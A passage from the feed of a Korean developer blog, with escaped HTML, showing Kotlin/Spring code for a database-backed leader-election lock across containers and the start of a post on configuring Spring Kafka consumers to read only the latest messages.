      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;expirationTime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utcNow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;isAfter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expirationTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;appConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZoneOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;n&quot;&gt;serviceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;appconfig&quot;&gt;AppConfig&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.global.config&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.annotation.PostConstruct&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Configuration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.BufferedReader&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.InputStreamReader&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.UUID&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;randomUUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@PostConstruct&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initContainerId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;c1&quot;&gt;// 'hostname' 명령어 실행을 위한 ProcessBuilder 사용  &lt;/span&gt;
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;processBuilder&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hostname&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InputStreamReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerIdString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// hostname 명령어의 결과  &lt;/span&gt;
        
          &lt;span class=&quot;c1&quot;&gt;// hostname 값이 비어 있지 않으면 containerId 업데이트  &lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerIdString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;isNullOrBlank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
              &lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containerIdString&lt;/span&gt;  
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;c1&quot;&gt;// 예외 발생 시 아무 일도 일어나지 않음  &lt;/span&gt;
          &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to retrieve container ID. Using default value.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;serviceleaderlockrepository&quot;&gt;ServiceLeaderLockRepository&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.repository&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.entity.ServiceLeaderLock&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.LockModeType&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.data.jpa.repository.JpaRepository&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.data.jpa.repository.Lock&lt;/span&gt;  
        
&lt;span class=&quot;kd&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockRepository&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JpaRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServiceLeaderLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;LockModeType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;PESSIMISTIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;someservice리더선출과정-진행-및-리더일-경우-리더-작업-실행&quot;&gt;SomeService(리더선출과정 진행 및 리더일 경우, 리더 작업 실행)&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.service&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.scheduling.annotation.Scheduled&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SomeService&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;serviceLeaderLockService&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockService&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;nd&quot;&gt;@Scheduled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fixedRate&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;runLeaderTask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;isAcquired&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serviceLeaderLockService&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tryToAcquireLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isAcquired&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;run some tasks&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;정리&quot;&gt;정리&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;DB 기반의 리더 선출 락을 구현하면, &lt;br /&gt;
다중 컨테이너 환경에서도 안정적으로 &lt;br /&gt;
리더 역할을 선출하고 유지할 수 있다.&lt;/li&gt;
  &lt;li&gt;트래픽이 높지 않거나 Redis 등 외부 락 시스템을 &lt;br /&gt;
도입하기 어려운 상황에서 &lt;br /&gt;
간단하면서도 효과적인 방식으로 활용이 가능하다.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Concurrency" /><category term="lock" /><category term="spring" /><category term="kotlin" /><summary type="html">개요 여러 컨테이너가 동시에 실행되는 환경에서는 특정 작업(이하 리더 작업)을 오직 하나의 컨테이너만 수행해야 할 때가 있다. 리더 작업은 리더가 주기적으로 실행하고 리더가 아닌 다른 컨테이너는 대기해야한다. 만약 리더가 다운되어 리더 작업이 불가능한 경우 최대한 빨리 대기하고 있는 다른 컨테이너 중 하나를 리더로 선출한 뒤 리더 작업을 이행해야한다. DB를 이용하여 리더선출락을 구현하고 리더선출 과정을 설명한다.</summary></entry><entry><title type="html">Spring Kafka에서 최신 메시지만 소비하는 Pub/Sub 방식 설정</title><link href="https://a3magic3pocket.github.io/posts/spring-kafka-latest-message-pub-sub-config/" rel="alternate" type="text/html" title="Spring Kafka에서 최신 메시지만 소비하는 Pub/Sub 방식 설정" /><published>2025-04-11T22:34:28+09:00</published><updated>2025-05-08T21:34:10+09:00</updated><id>https://a3magic3pocket.github.io/posts/spring-kafka-latest-message-pub-sub-config</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/spring-kafka-latest-message-pub-sub-config/">&lt;h2 id=&quot;설명&quot;&gt;설명&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Kafka를 Pub/Sub 방식으로 활용하고 싶을 때, &lt;br /&gt;
특정 토픽의 가장 최신 메시지만 소비하는 구조가 필요하다. &lt;br /&gt;
이 글에서는 Spring Kafka에서 &lt;br /&gt;
auto-offset-reset: latest와 seekToEnd() 설정을 조합하여, &lt;br /&gt;
컨슈머가 파티션에 연결되었을 때 항상 최신 메시지만 &lt;br /&gt;
소비하도록 설정하는 방법을 소개한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;auto-offset-reset-latest&quot;&gt;auto-offset-reset: latest&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;컨슈머 그룹이 아직 오프셋을 저장하지 않은 파티션을&lt;br /&gt;
처음 읽을 때 어디서부터 읽을지를 지정한다.&lt;/li&gt;
  &lt;li&gt;latest로 설정하면, 해당 컨슈머 그룹은 &lt;br /&gt;
파티션의 가장 마지막 메시지 이후부터 소비를 시작한다.&lt;/li&gt;
  &lt;li&gt;즉, 기존 메시지는 건너뛰고 새로 들어오는 메시지부터 읽는다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;seektoend&quot;&gt;seekToEnd()&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;리밸런싱 등으로 컨슈머가 파티션을 할당받을 때마다 &lt;br /&gt;
seekToEnd를 실행하여&lt;br /&gt;
이전에 읽던 위치와 상관없이 &lt;br /&gt;
현재 파티션의 마지막 메시지 이후부터&lt;br /&gt;
새로 도착하는 메시지만 읽게 된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;정책&quot;&gt;정책&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pub/Sub 대상이 되는 토픽을 구독하는 컨슈머 그룹 ID에&lt;br /&gt;
컨테이너 ID가 포함되도록 설정한다.&lt;br /&gt;
(컨슈머 그룹 ID를 동적으로 할당)&lt;/li&gt;
  &lt;li&gt;이를 통해 새 컨테이너가 생성될 시 자동으로 새 컨슈머 그룹 ID를 갖게 되고&lt;br /&gt;
latest 설정에 의해 최신 메세지만 받게 된다.&lt;/li&gt;
  &lt;li&gt;컨테이너가 재시작되어 기존 컨슈머 그룹 ID로 Kafka에 재연결되는 경우에도, &lt;br /&gt;
seekToEnd() 덕분에 이전 오프셋이 아닌 &lt;br /&gt;
가장 최신 메시지부터 소비를 시작할 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;applicationyml&quot;&gt;application.yml&lt;/h2&gt;
&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;spring&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
&lt;span class=&quot;na&quot;&gt;kafka&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;bootstrap-servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kafka:9092&quot;&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;producer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;key-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringSerializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;value-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.StringSerializer&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;auto-offset-reset&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;latest&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;enable-auto-commit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;key-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringDeserializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;value-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.StringSerializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;s&quot;&gt;spring.json.trusted.packages&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;기본 카프카 설정이지만 Pub/Sub 용 카프카 컨슈머는&lt;br /&gt;
MessageListenerContainer에서&lt;br /&gt;
auto-offset-reset: latest 설정을 직접할 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;seektoendreblanacelistener&quot;&gt;SeekToEndReblanaceListener&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.global.config&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.apache.kafka.clients.consumer.Consumer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.apache.kafka.common.TopicPartition&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.ConsumerAwareRebalanceListener&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Component&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Component&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SeekToEndRebalanceListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerAwareRebalanceListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onPartitionsAssigned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Consumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;partitions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MutableCollection&lt;/span&gt;&lt;span 